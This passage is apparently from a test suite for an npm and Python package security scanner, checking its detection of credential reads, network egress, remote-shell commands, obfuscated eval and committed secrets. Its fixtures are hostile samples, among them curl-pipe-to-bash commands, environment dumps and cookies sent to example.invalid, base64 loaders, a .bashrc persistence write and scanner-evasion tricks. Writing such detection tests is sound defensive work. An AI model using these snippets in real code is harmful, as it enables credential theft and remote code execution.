      { path: "package.json", size: manifest.length, sha256: "p", flags: [], textSample: manifest },
      { path: "dist/app.min.js", size: 1, sha256: "a", flags: ["content-skipped"] },
      { path: "f1.js", size: 1, sha256: "f", flags: [], textSample: "module.exports = 1;\n" },
    ];
    expect(() => deterministicFindings(staged, createPackageDiff([], staged))).not.toThrow();
    const notice = tarSuspiciousEntryFindings(
      [{ kind: "retention-tier", path: "<archive>", detail: "1 file body was hash-only" }],
      {
        fileDiff: [{ path: "dist/app.min.js", status: "modified", flags: ["content-skipped"] }],
        stagedFiles: staged,
      },
    );
    expect(notice).toHaveLength(1);
  }, 60_000);

  test("a Python import with half a million dotted segments still reviews", () => {
    const text = `import ${Array.from({ length: 500_000 }, () => "a").join(".")}\n`;
    const staged = [
      { path: "sdist/pkg/mod.py", size: text.length, sha256: "m", flags: [], textSample: text },
    ];
    expect(() =>
      deterministicFindings(staged, createPackageDiff([], staged), null, {
        codePatternSet: "python",
      }),
    ).not.toThrow();
  }, 60_000);

  test("a comment-only change does not make an existing credential read part of the release", () => {
    const previousFiles = [
      {
        path: "lib/index.js",
        size: 1,
        sha256: "a",
        flags: [],
        textSample: "const t = process.env.NPM_TOKEN;\nfetch(u, { body: t });\n",
      },
    ];
    const stagedFiles = [
      {
        path: "lib/index.js",
        size: 1,
        sha256: "b",
        flags: [],
        textSample:
          "// Copies process.env[name] for the child; see JSON.stringify(process.env) below.\nconst t = process.env.NPM_TOKEN;\nfetch(u, { body: t });\n",
      },
    ];
    const diff = createPackageDiff(previousFiles, stagedFiles);
    const findings = deterministicFindings(stagedFiles, diff, undefined, { previousFiles });
    const credential = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles,
      stagedFiles,
    }).find((finding) => finding.ruleId === "code.credential-access");
    expect(credential?.releaseDelta).toBeFalsy();
  });

  test("still flags secret-shaped, computed and whole-object environment uses", () => {
    const credentialFindings = (textSample) => {
      const staged = [
        { path: "index.js", size: textSample.length, sha256: "s", flags: [], textSample },
      ];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "code.credential-access",
      );
    };

    for (const textSample of [
      "const k = process.env.OPENAI_API_KEY;\n",
      "const k = process.env['STRIPE_SECRET'];\n",
      "const k = process?.env?.CI_JOB_TOKEN;\n",
      "const k = import.meta.env.VITE_SUPABASE_KEY;\n",
      "const { AWS_REGION } = process.env;\n",
      "const {\n  CI_JOB_JWT: identity,\n} = process.env;\n",
      "const { PORT, ...rest } = process.env;\n",
      // A destructuring assignment evaluates to the whole env object.
      "let HOME;\nmodule.exports = () => JSON.stringify({ HOME } = process.env);\n",
      "let HOME, PATH;\nfs.writeFileSync(out, JSON.stringify(({ HOME, PATH } = process.env)));\n",
      "let HOME;\nprocess.send({ HOME } = process.env);\n",
      "const k = process.env.CI_JOB_JWT_V2;\n",
      "const f = readFileSync(process.env.KUBECONFIG);\n",
      "const f = process.env.DOCKER_CONFIG + '/config.json';\n",
      "const t = process.env.npm_config__auth;\n",
      'const t = process.env["npm_config_//registry.npmjs.org/:_authToken"];\n',
      "const t = Deno.env.get('GH_PAT');\n",
      "const v = process.env[name];\n",
      "const v = process.env[`NPM_${kind}`];\n",
      "const v = globalThis.process[key];\n",
      "const v = process.env['NPM_' + 'TOKEN'];\n",
      "send(JSON.stringify(process.env));\n",
      "for (const k in process.env) out[k] = 1;\n",
      "const all = Object.entries(process.env);\n",
      "post(url, { body: { ...process.env } });\n",
      "req.end(process.env);\n",
      "module.exports = process.env;\n",
      "const env = process.env;\nconst key = env.ANTHROPIC_API_KEY;\n",
      "const e = process.env;\nhttps.request(u).end(JSON.stringify(e));\n",
      // The env object as a value: copied, spread, wrapped, passed or bound.
      "const copy = Object.assign({}, process.env);\n",
      "const snapshot = { ...process.env };\n",
      "const q = new URLSearchParams(process.env);\n",
      "report(process.env);\n",
      "function f(e = process.env) { return e.CI; }\n",
      "const mode = (null == process ? void 0 : process.env)?.NPM_TOKEN;\n",
      "const env = process.env;\nconst names = Object.keys(env);\n",
      "const env = process.env, copy = env;\n",
      // A child inherits the environment anyway, but a callee named `spawn` is
      // not proof of a child process, so handing the object on still counts.
      "spawn(cmd, args, { env: { ...process.env, FORCE_COLOR: '1' } });\n",
      "const v = globalThis['proc' + 'ess']['e' + 'nv'];\n",
    ]) {
      expect(credentialFindings(textSample), textSample).toHaveLength(1);
    }
  });

  test("socket, HTTP/2, TLS and userland clients are network egress", () => {
    for (const textSample of [
      "const dgram = require('node:dgram');\n",
      "const tls = require ( 'tls' );\n",
      "import http2 from 'http2';\n",
      "import { request } from 'undici';\n",
      "const WebSocket = require('ws');\n",
      "const { connect } = await import('node:net');\n",
      "const ws = new WebSocket('wss://example.invalid');\n",
      "navigator.sendBeacon('https://example.invalid', body);\n",
    ]) {
      const staged = [
        { path: "lib/x.js", size: textSample.length, sha256: "n", flags: [], textSample },
      ];
      expect(
        deterministicFindings(staged, createPackageDiff([], staged)).map((f) => f.ruleId),
        textSample,
      ).toContain("code.network-access");
    }
  });

  test("network and eval patterns ignore comments and code emitted as strings", () => {
    const ruleIds = (textSample, path = "lib/index.js") => {
      const staged = [{ path, size: textSample.length, sha256: "c", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).map(
        (finding) => finding.ruleId,
      );
    };

    expect(
      ruleIds(
        "/**\n * import { createServer } from 'node:http';\n */\n// fetch() leaves them alone\nconst x = 1; /* XMLHttpRequest */\n",
      ),
    ).toEqual([]);
    expect(
      ruleIds(
        'const code = ["WebAssembly.compile(bytes)", "eval()"];\nclass Node { eval(context) { return this; } }\n' +
          "const load = new Function('specifier', 'return import(specifier)');\n" +
          "const vite = new Function('return import(\"vite\")');\n" +
          "exports.P = new Function('return this;')().Promise;\n",
      ),
    ).toEqual([]);
    // Template text around a substitution, and literals inside one, are data.
    expect(
      ruleIds(
        "const src = `eval(${JSON.stringify(code)} + ${'\\n//# sourceURL=x'})`;\n" +
          'const wasm = `.then(${rt.returningFunction("WebAssembly.compile(bytes)", "bytes")})`;\n',
      ),
    ).toEqual([]);
    // The same text in a non-JavaScript file is not lexed, so nothing is blanked.
    expect(ruleIds("# fetch('https://example.invalid')\n", "scripts/run.sh")).toContain(
      "code.network-access",
    );
    // Annex B HTML-like comments are code in module source and stay visible.
    expect(ruleIds("if (a <!--b) fetch('https://example.invalid');\n", "lib/index.mjs")).toContain(
      "code.network-access",
    );
    // and their presence anywhere leaves the whole file unblanked, since the
    // lexer's template boundaries after one may be wrong.
    expect(
      ruleIds("let t = '', a = 1, b = 1\nif (!(a <!--b)) t = `\n// fetch(u)\n`\n", "lib/a.js"),
    ).toContain("code.network-access");
    expect(ruleIds("while (n-->0) step()\n// fetch(u)\n", "lib/a.js")).toContain(
      "code.network-access",
    );
    for (const textSample of [
      "if (!fetch(url)) {\n}\n",
      "if (eval(code)) {\n}\n",
      "eval(code)\n{ }\n",
      "const f = new Function(`var callback = ${source}`);\n",
      "const f = new Function('a', 'return import(a); fetch(a)');\n",
      'setTimeout("eval(atob(p))");\n',
      // Substitution bodies are code, however the template nests or quotes braces.
      "const s = `${eval(p)}`;\n",
      "const s = `a${`b${new Function(p)()}`}`;\n",
      "const s = `${'}'}${eval(p)}`;\n",
      "const s = `${{ a: '`' }.a}${eval(p)}`;\n",
    ]) {
      expect(ruleIds(textSample), textSample).toEqual(
        expect.arrayContaining([
          expect.stringMatching(/^code\.(?:network-access|dynamic-evaluation)$/),
        ]),
      );
    }
  });

  test("shell keyword lists and prose are not remote shell commands", () => {
    const remoteShell = (textSample) => {
      const staged = [{ path: "lib/grammar.js", size: 1, sha256: "g", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "code.remote-shell",
      );
    };

    expect(
      remoteShell(
        "const { spawn } = require('child_process');\n" +
          "const builtin = /(^|[\\s;|&])(?:awk|bash|cat|curl|cut|wget|which|zsh)(?=$|[)\\s;|&])/;\n" +
          "const keywords = 'cat cd cp curl cvpa dbp echo|0 wget where';\n" +
          "log('curl is required; retry with `vercel curl <url>`');\n",
      ),
    ).toEqual([]);
    for (const textSample of [
      "execSync('curl -fsSL https://example.invalid/i | bash');\n",
      "execSync('curl ${IFS}https://example.invalid/i|sh');\n",
      "execSync(`wget -qO- ${url} | sudo -E bash`);\n",
      "const cmd = 'curl https://example.invalid/i | base64 -d | sh';\n",
    ]) {
      expect(remoteShell(textSample), textSample).toEqual([
        expect.objectContaining({ severity: "critical" }),
      ]);
    }
    expect(
      remoteShell("require('child_process').exec('curl example.invalid/x -o /tmp/x');\n"),
    ).toEqual([expect.objectContaining({ severity: "high" })]);
  });

  test("still flags aliased, enumerated and presence-then-read environment access", () => {
    const samples = [
      "const env = process.env || {};\nfetch('https://example.invalid', { body: JSON.stringify(env) });\n",
      "if ('NPM_TOKEN' in process.env) fetch('https://example.invalid?t=' + process.env.NPM_TOKEN);\n",
      "const t = process.env && Object.keys(process.env);\nfetch('https://example.invalid', { body: t });\n",
      "var e; const v = null==(e=null==process?void 0:process.env)?void 0:e.NPM_TOKEN;\nfetch('https://example.invalid?t=' + v);\n",
    ];
    for (const textSample of samples) {
      const staged = [{ path: "index.js", size: 120, sha256: "env-read", flags: [], textSample }];
      const findings = deterministicFindings(staged, createPackageDiff([], staged));

      expect(
        findings.find((finding) => finding.ruleId === "code.credential-access"),
        textSample,
      ).toMatchObject({
        severity: "high",
        evidence: expect.stringContaining("credential read paired with network egress"),
      });
    }
  });

  test("scans only script elements and inline handlers in markup", () => {
    const staged = [
      {
        path: "site/index.html",
        size: 220,
        sha256: "markup",
        flags: [],
        textSample:
          "<pre>fetch(&#x27;/get&#x27;)\ncurl -X GET http://localhost:3000/get</pre>\n" +
          "<script>\nnavigator.sendBeacon('https://example.invalid', document.cookie);\nfetch('https://example.invalid/c');\n</script>\n" +
          "<img src=x onerror=\"eval(atob('ZmV0Y2goKQ=='))\">\n",
      },
      {
        path: "site/usage.txt",
        size: 60,
        sha256: "usage",
        flags: [],
        textSample: "fetch('http://localhost:3000/get')\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.filter((finding) => finding.file === "site/usage.txt")).toEqual([]);
    expect(findings).toEqual(
      expect.arrayContaining([
        // `navigator.sendBeacon(...)` on line 4 is itself egress.
        expect.objectContaining({
          ruleId: "code.network-access",
          file: "site/index.html",
          line: 4,
        }),
        expect.objectContaining({
          ruleId: "code.dynamic-evaluation",
          file: "site/index.html",
          line: 7,
        }),
      ]),
    );
  });

  test("counts base64 decoding only beside an execution or network sink", () => {
    const decodeOnly = [
      {
        path: "codec.js",
        size: 90,
        sha256: "codec",
        flags: [],
        textSample:
          "export const decode = (text) => new Uint8Array(Buffer.from(text, 'base64'));\n",
      },
    ];
    const decodeAndSend = [
      {
        path: "geo.js",
        size: 120,
        sha256: "geo",
        flags: [],
        textSample:
          "const host = Buffer.from('ZXhhbXBsZS5pbnZhbGlk', 'base64').toString();\nrequire('https').get('https://' + host);\n",
      },
    ];
    const decodeAndRun = [
      {
        path: "run.js",
        size: 120,
        sha256: "run",
        flags: [],
        textSample: "const code = atob(payload);\nrequire('child_process').execSync(code);\n",
      },
    ];
    const ruleIds = (staged) =>
      deterministicFindings(staged, createPackageDiff([], staged)).map((f) => f.ruleId);

    expect(ruleIds(decodeOnly)).not.toContain("code.dynamic-evaluation");
    expect(ruleIds(decodeAndSend)).toContain("code.dynamic-evaluation");
    expect(ruleIds(decodeAndRun)).toContain("code.dynamic-evaluation");
  });

  test("keeps global, indirect and shim-laundered eval while ignoring method-named eval", () => {
    const evalFindings = (textSample) => {
      const staged = [{ path: "index.js", size: 80, sha256: "eval", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "code.dynamic-evaluation",
      );
    };

    expect(evalFindings("client.eval(script, 1, key);\n")).toEqual([]);
    expect(evalFindings("var g = g || new Function('return this')();\n")).toEqual([]);
    expect(evalFindings("globalThis.eval(payload);\n")).toHaveLength(1);
    expect(evalFindings("(0, eval)('this');\n")).toEqual([]);
    expect(evalFindings("new Function('return this')().eval(payload);\n")).toHaveLength(1);
  });

  test("does not read minified property tables as secrets but keeps literal values", () => {
    const secretFindings = (path, textSample) => {
      const staged = [{ path, size: 120, sha256: path, flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "file.secret-content",
      );
    };

    expect(
      secretFindings(
        "panel.js",
        "var a={password:!0,range:!0,search:!0,tel:!0};function L(t){this.token=t,this.line=1,this.column=0}\n",
      ),
    ).toEqual([]);
    expect(secretFindings("config.js", 'const apiKey = "FAKE-live-000000000000";\n')).toHaveLength(
      1,
    );
    expect(secretFindings("config.yml", "password: FAKE-s3cr3t-000000\n")).toHaveLength(1);
  });

  test("demotes a credential-named file only when no secret is recognized in it", () => {
    const file = (path, textSample) => ({ path, size: 40, sha256: path, flags: [], textSample });
    const previous = [file("lib/test.env", "PORT=3000\n")];
    const staged = [
      file("lib/test.env", "PORT=3000\n"),
      file(".npmrc", "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n"),
      file("deploy.env", "API_TOKEN=FAKE-000000000000000000\n"),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged)).filter(
      (finding) => finding.ruleId === "file.secret-content",
    );

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          file: "lib/test.env",
          severity: "medium",
          evidence: expect.stringContaining(
            "credential-named file without recognized secret content",
          ),
        }),
        expect.objectContaining({ file: ".npmrc", severity: "high" }),
        expect.objectContaining({ file: "deploy.env", severity: "critical" }),
      ]),
    );
  });

  test("scans data and markup formats whole once something loads them as code", () => {
    const record = (path, textSample) => ({
      path,
      size: textSample.length,
      sha256: path,
      flags: [],
      textSample,
    });
    const payload = "require('child_process').execSync('curl https://example.invalid/x | sh');\n";
    const cases = [
      [
        { name: "pkg", version: "1.0.0", scripts: { postinstall: "node install.txt" } },
        [record("install.txt", payload)],
        "install.txt",
      ],
      [
        { name: "pkg", version: "1.0.0", scripts: { postinstall: "node setup.html" } },
        [record("setup.html", payload)],
        "setup.html",
      ],
      [
        { name: "pkg", version: "1.0.0", main: "lib/core.css" },
        [record("lib/core.css", payload)],
        "lib/core.css",
      ],
      [
        { name: "pkg", version: "1.0.0", main: "index.js" },
        [record("index.js", "require('./data.map');\n"), record("data.map", payload)],
        "data.map",
      ],
      [
        { name: "pkg", version: "1.0.0", main: "index.js" },
        [
          record("index.js", "module.exports = 1;\n"),
          record("lib/loader.js", "require(__dirname + '/p.txt');\n"),
          record("lib/p.txt", payload),
        ],
        "lib/p.txt",
      ],
    ];
    for (const [manifest, files, payloadPath] of cases) {
      const staged = [record("package.json", JSON.stringify(manifest)), ...files];
      const findings = deterministicFindings(staged, createPackageDiff([], staged), manifest);

      expect(
        findings.find(
          (finding) => finding.ruleId === "code.remote-shell" && finding.file === payloadPath,
        ),
        payloadPath,
      ).toMatchObject({ severity: "critical" });
    }

    const unloaded = [record("package.json", '{"name":"pkg"}'), record("notes.txt", payload)];
    expect(
      deterministicFindings(unloaded, createPackageDiff([], unloaded)).filter(
        (finding) => finding.file === "notes.txt",
      ),
    ).toEqual([]);
  });

  test("still counts decoding that feeds a compiler, loader, timer or disk write", () => {
    const samples = [
      "Function(atob(p))();\n",
      "require('vm').runInThisContext(Buffer.from(p, 'base64').toString());\n",
      "vm.runInNewContext(atob(p));\n",
      "require(atob('Y2hpbGRfcHJvY2Vzcw=='));\n",
      "setTimeout(atob(p));\n",
      "require('fs').writeFileSync(target, Buffer.from(p, 'base64'));\nrequire(target);\n",
      "module._compile(Buffer.from(p, 'base64').toString(), file);\n",
      "import('data:text/javascript,' + atob(p));\n",
      "(0, eval)(atob(p));\n",
      "const run = eval;\nrun(atob(p));\n",
      "const F = Function;\nF(atob(p))();\n",
      "Reflect.construct(Function, [atob(p)]);\n",
      "[].constructor.constructor(atob(p))();\n",
      "new Worker(atob(p), { eval: true });\n",
      "const u = 'data:text/javascript,' + atob(p);\nimport(u);\n",
      "require('fs').appendFileSync(require('os').homedir() + '/.bashrc', atob(p));\n",
      "require('fs').writeFileSync(__dirname + '/x.js', Buffer.from(p, 'base64'));\nrequire('./x.js');\n",
    ];
    for (const textSample of samples) {
      const staged = [{ path: "run.js", size: 80, sha256: "run", flags: [], textSample }];
      const ruleIds = deterministicFindings(staged, createPackageDiff([], staged)).map(
        (f) => f.ruleId,
      );

      expect(ruleIds, textSample).toContain("code.dynamic-evaluation");
    }
  });

  test("keeps python decoding ungated", () => {
    const staged = [
      {
        path: "pkg/loader.py",
        size: 80,
        sha256: "loader",
        flags: [],
        textSample: "import base64, pickle\npickle.loads(base64.b64decode(P))\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings.map((finding) => finding.ruleId)).toContain("code.dynamic-evaluation");
  });

  test("keeps eval laundered through the global shim, other globals or optional calls", () => {
    const evalFindings = (textSample) => {
      const staged = [{ path: "index.js", size: 80, sha256: "eval", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "code.dynamic-evaluation",
      );
    };

    expect(evalFindings("var root = freeGlobal || Function('return this')();\n")).toEqual([]);
    for (const laundered of [
      "(new Function('return this')()).eval(p);\n",
      "new Function('return this')()?.eval(p);\n",
      "top.eval(p);\n",
      "globalThis?.eval(p);\n",
      "eval?.(p);\n",
    ]) {
      expect(evalFindings(laundered), laundered).toHaveLength(1);
    }
  });

  test("still counts an assignment alias of process.env read for a common name", () => {
    const staged = [
      {
        path: "index.js",
        size: 90,
        sha256: "alias",
        flags: [],
        textSample:
          "const mode = (e = process.env).NODE_ENV;\nfetch('https://example.invalid', { body: JSON.stringify(e) });\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      severity: "high",
    });
  });

  test("scans unquoted inline handlers in markup", () => {
    const staged = [
      {
        path: "site/index.html",
        size: 80,
        sha256: "handler",
        flags: [],
        textSample: "<p>docs</p>\n<img src=x onerror=eval(atob('ZmV0Y2goKQ=='))>\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.dynamic-evaluation",
          file: "site/index.html",
          line: 2,
        }),
      ]),
    );
  });

  test("recognizes punctuated passwords and literal npm auth values", () => {
    const secretSeverity = (path, textSample) => {
      const staged = [{ path, size: 60, sha256: path, flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).find(
        (finding) => finding.ruleId === "file.secret-content",
      )?.severity;
    };

    expect(secretSeverity("config.yml", "password: Sup3r$ecretP@ss!\n")).toBe("critical");
    expect(secretSeverity(".env.local", "DB_PASSWORD=P@ssw0rd!2024xyz\n")).toBe("critical");
    expect(
      secretSeverity(
        ".npmrc",
        "//registry.npmjs.org/:_authToken=00000000-0000-4000-8000-000000000000\n",
      ),
    ).toBe("critical");
    expect(secretSeverity(".npmrc", "_auth=ZmFrZTpmYWtlLWZpeHR1cmU=\n")).toBe("critical");
  });

  test("does not treat compiler and loader calls without a decode as dynamic evaluation", () => {
    const samples = [
      'Function("r", "regeneratorRuntime = r")(runtime);\n',
      "var run = Function(handler);\n",
      "result = Function(importsKeys, sourceURL + 'return ' + source).apply(undefined, importsValues);\n",
      "vm.runInContext(code, this._globalProxy);\n",
      "module._compile(js.code, filename);\n",
      "var g = (0, eval)('this');\n",
      "/** @param func { Function(offset: number) => number } */\n",
    ];
    for (const textSample of samples) {
      const staged = [{ path: "lib.js", size: 80, sha256: "lib", flags: [], textSample }];
      const ruleIds = deterministicFindings(staged, createPackageDiff([], staged)).map(
        (f) => f.ruleId,
      );

      expect(ruleIds, textSample).not.toContain("code.dynamic-evaluation");
    }
  });

  test("does not read documentation placeholders or minified operators as secrets", () => {
    const secretFindings = (path, textSample) => {
      const staged = [{ path, size: 60, sha256: path, flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "file.secret-content",
      );
    };

    expect(secretFindings("README.md", "//registry.npmjs.org/:_authToken=MYTOKEN1\n")).toEqual([]);
    expect(secretFindings("docs/npmrc.html", "_authToken=YOUR_NPM_TOKEN\n")).toEqual([]);
    expect(
      secretFindings("lib/a.js", "var pass=n.pass!==void 0?n.pass:x.token!==void 0;\n"),
    ).toEqual([]);
    expect(secretFindings("lib/b.js", "x.password=n.password!==void 0&&y;\n")).toEqual([]);
    expect(secretFindings(".npmrc", "//registry.npmjs.org/:_authToken=<your-token>\n")).toEqual([
      expect.objectContaining({ severity: "high" }),
    ]);
  });

  test("recognizes semicolon-delimited connection string passwords", () => {
    const staged = [
      {
        path: "appsettings.json",
        size: 90,
        sha256: "settings",
        flags: [],
        textSample:
          '{"ConnectionStrings":{"Default":"Server=db;User Id=sa;Password=Sup3rSecretPass1;Database=x"}}\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.find((finding) => finding.ruleId === "file.secret-content")).toMatchObject({
      severity: "critical",
    });
  });

  test("keeps script hidden behind a fake close tag or in a javascript: URL", () => {
    const staged = [
      {
        path: "site/index.html",
        size: 120,
        sha256: "markup-evasion",
        flags: [],
        textSample:
          "<script>/*</scriptx>*/eval(atob('ZmV0Y2goKQ=='))</script>\n" +
          "<a href=\"javascript:eval(atob('ZmV0Y2goKQ=='))\">x</a>\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged)).filter(
      (finding) => finding.ruleId === "code.dynamic-evaluation",
    );

    expect(findings).toEqual([expect.objectContaining({ file: "site/index.html", line: 1 })]);
    const javascriptUrlOnly = [
      { ...staged[0], textSample: "<p>docs</p>\n" + staged[0].textSample.split("\n")[1] },
    ];
    expect(
      deterministicFindings(javascriptUrlOnly, createPackageDiff([], javascriptUrlOnly)).find(
        (finding) => finding.ruleId === "code.dynamic-evaluation",
      ),
    ).toMatchObject({ line: 2 });
  });

  test("checks thousands of data files against load calls in linear time", () => {
    const staged = [
      {
        path: "index.js",
        size: 10,
        sha256: "i",
        flags: [],
        textSample: "require(x + y);\n".repeat(20_000),
      },
      ...Array.from({ length: 2_500 }, (_, i) => ({
        path: `styles/s${i}.css`,
        size: 10,
        sha256: `s${i}`,
        flags: [],
        textSample: "a{color:red}\n",
      })),
    ];
    const started = performance.now();
    deterministicFindings(staged, createPackageDiff([], staged));
    expect(performance.now() - started).toBeLessThan(3000);
  });

  test("counts decoding reached through aliases, constructors and other runtimes", () => {
    const samples = [
      "const run = eval\nrun(atob(p))\n",
      "var e = globalThis.eval; e(atob(p));\n",
      "const { eval: run } = globalThis;\nrun(atob(p));\n",
      "eval.call(null, atob(p));\n",
      "(() => {}).constructor(atob(p))();\n",
      "Object.constructor(atob(p))();\n",
      "const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;\nnew AsyncFunction(atob(p));\n",
      "new W(atob(p), { eval: !0 });\n",
      "new WebAssembly.Module(Buffer.from(p, 'base64'));\n",
      "document.write(atob(p));\n",
    ];
    for (const textSample of samples) {
      const staged = [{ path: "index.js", size: 80, sha256: "idx", flags: [], textSample }];
      const ruleIds = deterministicFindings(staged, createPackageDiff([], staged)).map(
        (f) => f.ruleId,
      );

      expect(ruleIds, textSample).toContain("code.dynamic-evaluation");
    }
  });

  test("scans markup whole when a script-capable attribute spells code with references", () => {
    const dynamicEvaluation = (textSample) => {
      const staged = [{ path: "site/page.html", size: 80, sha256: "page", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "code.dynamic-evaluation",
      );
    };

    expect(
      dynamicEvaluation("<img src=x onerror=\"&#101;val(atob('ZmV0Y2goKQ=='))\">\n"),
    ).toHaveLength(1);
    expect(
      dynamicEvaluation("<a href=\"java&#x09;script:eval(atob('ZmV0Y2goKQ=='))\">x</a>\n"),
    ).toHaveLength(1);
    expect(
      dynamicEvaluation("<a href=\"java\tscript:eval(atob('ZmV0Y2goKQ=='))\">x</a>\n"),
    ).toHaveLength(1);
    expect(
      dynamicEvaluation('<a href="/docs?a=1&amp;b=2">x</a>\n<pre>atob(&#x27;x&#x27;)</pre>\n'),
    ).toEqual([]);
  });

  test("follows a template-literal load path to a data file", () => {
    const record = (path, textSample) => ({ path, size: 40, sha256: path, flags: [], textSample });
    const staged = [
      record("package.json", '{"name":"pkg","main":"index.js"}'),
      record("index.js", "require(`./${name}.txt`);\n"),
      record(
        "payload.txt",
        "require('child_process').execSync('curl https://example.invalid | sh');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(
      findings.find((f) => f.ruleId === "code.remote-shell" && f.file === "payload.txt"),
    ).toMatchObject({
      severity: "critical",
    });
  });

  test("does not read connection-string placeholders or property reads as passwords", () => {
    const secretFindings = (textSample) => {
      const staged = [{ path: "lib/db.js", size: 80, sha256: "db", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "file.secret-content",
      );
    };

    expect(secretFindings("const c = `Server=${host};User Id=sa;Password=${pwd};`;\n")).toEqual([]);
    expect(secretFindings("// Server=db;User Id=sa;Password=<password>;\n")).toEqual([]);
    expect(secretFindings("o.host=e.host;password=e.password;\n")).toEqual([]);
    expect(
      secretFindings(
        "return `sqlserver://localhost;database=mydb;user=SA;password=randompassword;`;\n",
      ),
    ).toEqual([]);
  });

  describe("generic key/value secrets", () => {
    const secretFindings = (textSample, path = "lib/index.js") => {
      const staged = [{ path, size: textSample.length, sha256: path, flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "file.secret-content",
      );
    };

    test.each([
      ['  token: "__ASTRO_ASSET_IMAGE__",\n'],
      ['const MODULE_REFERENCE_TOKEN = "__WEBPACK_MODULE_REFERENCE__";\n'],
      ['  DATA_PROXY_SECRET: "MINIFLARE_PROXY_SECRET",\n'],
      ['var VERCEL_OIDC_TOKEN="VERCEL_OIDC_TOKEN",SENSITIVE="[SENSITIVE]";\n'],
      ['  PROXY_SHARED_SECRET: "MF-Proxy-Shared-Secret",\n'],
      ["  INVALID_API_KEY: 'auth/invalid-api-key',\n"],
      ["const X509_SUBJECT_TOKEN = 'urn:ietf:params:oauth:token-type:x509';\n"],
      ['  { token: "delimiter.curly", open: "{", close: "}" },\n'],
      ['  [/@\\w+/, { token: "@brackets.directive" }],\n'],
      ['  [/\\$\\w+/, { token: "type.reserved.$0" }],\n'],
      [" * token: 'TotallyRealToken',\n"],
      ["      password: parsedURL.password\n"],
      ["      token: record.token\n"],
      ["    var token = this.context.strict ? options.stricted : options.firstRestricted;\n"],
      ["    password: options.password\n"],
      ["        token: n._authToken || n.token,\n"],
      ['    const password = this.options.proxy.password || "";\n'],
      ["    const apiKey = props.__apiKey === undefined ? client.apiKey : props.__apiKey;\n"],
      ["  target.username = target.password = target.search = target.hash = '';\n"],
      ["  setOidcToken({ config, opts, authTokenKey, token: response.token })\n"],
      ["exports.OperationTypeNode = exports.Token = exports.Location = void 0;\n"],
      ["    const token = relatedModuleToken\n"],
      ["      password:\n            options.password\n"],
      ["    $token = Get-AzAccessToken @params\n"],
      [' * const clientSecret = "<client-secret>";\n'],
      ['  apiKey:"${AI_GATEWAY_API_KEY}"\n'],
      ["exports.DEFAULT_PROJECT_ID_TOKEN = '{{projectId}}';\n"],
      ['w=q("Enter password: "),m=n.limitMessage;!v;)n.limit=A,w=q(t,n),r=["Retry"];\n'],
    ])("does not read %j as a secret", (textSample) => {
      expect(secretFindings(textSample)).toEqual([]);
    });

    test.each([
      ['const API_KEY = "sk-live-4f9b2c7e1a8d3f6b0c5e9a2d";\n', "lib/client.js"],
      ['  password: "Tr0ub4dor&3xyzzy",\n', "lib/client.js"],
      ["  apiKey: 'a8f5f167f44f4964e6c998dee827110c',\n", "lib/client.js"],
      ['  client_secret: "0bXq7Zr2LmN8vK4pT1sW9yD6",\n', "lib/client.js"],
      ["  token: 'dGhpc2lzbm90YXJlYWx0b2tlbjEyMw==',\n", "lib/client.js"],
      ['  password: "SuperSecretPasswordValue"\n', "lib/client.js"],
      ["API_KEY=sk-abc123def456ghi789\n", "config/production.conf"],
      ["APP_SECRET=8f14e45fceea167a5a36dedd4bea2543\n", "config/production.conf"],
      ["password: Tr0ub4dor&3xyzzy\n", "config/settings.yml"],
      ["export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYzz1x2y\n", "scripts/deploy.sh"],
    ])("flags %j", (textSample, path) => {
      expect(secretFindings(textSample, path)).toHaveLength(1);
    });

    test("scans a run of keys without rescanning from each one", () => {
      const started = performance.now();
      secretFindings("token:".repeat(40_000));
      secretFindings(`token:"${"token:".repeat(40_000)}`);
      expect(performance.now() - started).toBeLessThan(2000);
    });

    // Provider-shaped fakes are assembled at runtime so no committed file
    // carries a literal that secret scanners read as a live credential.
    const fakeSendGrid = [
      "SG",
      "Fx7Qp2Lm9Rt4Vb6Nc8Wd1Z",
      "Gh3Jk5Lm7Np9Qr2St4Uv6Wx8Yz0Ab1Cd3Ef5Gh7Ij9K",
    ];
    const fakeDiscord = ["MTAwMDAwMDAwMDAwMDAwMDAw", "GaBcDe", "Fx7Qp2Lm9Rt4Vb6Nc8Wd1Zk3Jh5"];
    const fakeAwsKeyId = ["AKIA", "Q7XK2M9PLR4T8VB3"];

    test.each([
      [
        "SendGrid key in .env",
        () => `SENDGRID_API_KEY=${fakeSendGrid.join(".")}\n`,
